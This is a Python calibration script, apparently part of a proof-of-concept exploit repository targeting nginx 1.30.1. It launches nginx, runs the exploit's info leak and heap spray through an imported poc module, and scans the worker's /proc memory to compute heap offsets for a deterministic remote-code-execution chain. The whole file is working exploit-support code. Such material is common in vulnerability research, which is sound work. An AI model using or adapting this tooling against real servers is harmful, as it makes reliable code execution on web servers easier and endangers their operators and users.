#!/usr/bin/env python3
# Find PL_OFF and HEAP_PAGE_OFF for --rce-det on this build/config. The deterministic
# chain plants the victim pool's cleanup at heap_base + PL_OFF, where a held partial
# POST /b/ body lands; that offset depends on the exact pre-spray allocation sequence,
# so it shifts across builds, glibc versions, configs, and even the nginx -p prefix
# path length. This launches nginx with the SAME command the README uses for --rce-det
# (so the offset it reports matches your run), reads the worker's memory as its parent,
# reproduces the exploit's warmup, leak, and spray, then reports the offsets for poc.py.
# Run it from the repo root with no other nginx bound to 8950:
#   NGINX_BIN=../nginx-1.30.1/objs.dbg/nginx python3 exploits/calibrate.py
# If you launch nginx for --rce-det with a different -p prefix or -c config, pass the
# same ones here:  python3 exploits/calibrate.py -p <prefix> -c <config>
import os
import socket
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc

NGINX = os.environ.get("NGINX_BIN")
PREFIX = "run"  # matches README: nginx -p run
CONF = os.path.abspath("configs/nginx_det.conf")
argv = sys.argv[1:]
for i, a in enumerate(argv):
    if a == "-p" and i + 1 < len(argv):
        PREFIX = argv[i + 1]
    if a == "-c" and i + 1 < len(argv):
        CONF = os.path.abspath(argv[i + 1])
MARK = b"CALmk_"


def leak_base(pid):
    poc.warmup(30)
    time.sleep(0.1)
    for _ in range(20):
        body, libc, heap = poc.do_leak()
        if (
            body
            and 0x100000000000 < libc < 0x800000000000
            and (libc - poc.LIBC_LEAK_OFFSET) & 0xFFF == 0
            and 0x100000000000 < heap < 0x800000000000
        ):
            return heap
    return None


def heap_extent(pid):
    for line in open("/proc/%d/maps" % pid):
        if "[heap]" in line:
            a, b = line.split()[0].split("-")
            return int(a, 16), int(b, 16)
    return None, None


def holder_offsets(pid, heap_base, n):
    socks = []
    for i in range(n):
        s = socket.create_connection((poc.HOST, poc.PORT), timeout=2)
        s.sendall(
            b"POST /b/zz HTTP/1.1\r\nHost: x\r\nContent-Length: 4096\r\n\r\n"
            + (MARK + b"%02d" % i).ljust(poc.PL_LEN, b"\xcc")
        )
        socks.append(s)
        time.sleep(0.003)
    time.sleep(0.15)
    hs, he = heap_extent(pid)
    mem = open("/proc/%d/mem" % pid, "rb")
    offs, addr = [], hs
    while addr < he:
        try:
            mem.seek(addr)
            buf = mem.read(0x1000)
        except OSError:
            addr += 0x1000
            continue
        j = buf.find(MARK)
        while j >= 0:
            offs.append(addr + j - heap_base)
            j = buf.find(MARK, j + 1)
        addr += 0x1000
    for s in socks:
        try:
            s.close()
        except OSError:
            pass
    return sorted(offs)


def main():
    if not NGINX or not os.path.isfile(NGINX):
        print("[!] set NGINX_BIN to a clean (non-ASan) nginx 1.30.1 build")
        return 1
    if not os.path.isfile(CONF):
        print("[!] config not found: %s" % CONF)
        return 1
    poc.HOST, poc.PORT = "127.0.0.1", 8950

    os.makedirs(os.path.join(PREFIX, "logs"), exist_ok=True)
    print("launching: %s -p %s -c %s" % (NGINX, PREFIX, CONF))
    proc = subprocess.Popen(
        [NGINX, "-p", PREFIX, "-c", CONF],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    time.sleep(0.8)
    if proc.poll() is not None:
        print(
            "[!] nginx exited: " + proc.stderr.read().decode(errors="replace").strip()
        )
        print("    (is another nginx already bound to 8950?)")
        return 1
    try:
        heap = leak_base(proc.pid)
        if heap is None:
            print("[!] info leak failed; is this the clean build and the right config?")
            return 2
        heap_base = (heap & ~0xFFF) - poc.HEAP_PAGE_OFF
        hs, _ = heap_extent(proc.pid)
        print("leaked heap ptr   0x%x" % heap)
        print("derived heap_base 0x%x" % heap_base)
        print(
            "real [heap] start 0x%x   %s"
            % (
                hs,
                "OK"
                if heap_base == hs
                else "MISMATCH -> HEAP_PAGE_OFF = 0x%x" % (heap - hs & ~0xFFF),
            )
        )
        offs = holder_offsets(proc.pid, heap_base, poc.PL_HOLDERS)
        if not offs:
            print("[!] no held bodies found in the heap")
            return 2
        pl = offs[0]
        print(
            "held /b/ bodies at heap_base+ : %s" % ", ".join("0x%x" % o for o in offs)
        )
        print()
        print(
            "set PL_OFF = 0x%x   (current poc.py: 0x%x %s)"
            % (pl, poc.PL_OFF, "OK" if pl == poc.PL_OFF else "<- UPDATE")
        )
        if b"\x0a" in poc.p64(heap_base + pl):
            print(
                "note: this base draws a 0x0a in the plant address; --rce-det reports it and you rerun"
            )
        return 0
    finally:
        proc.kill()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    sys.exit(main())
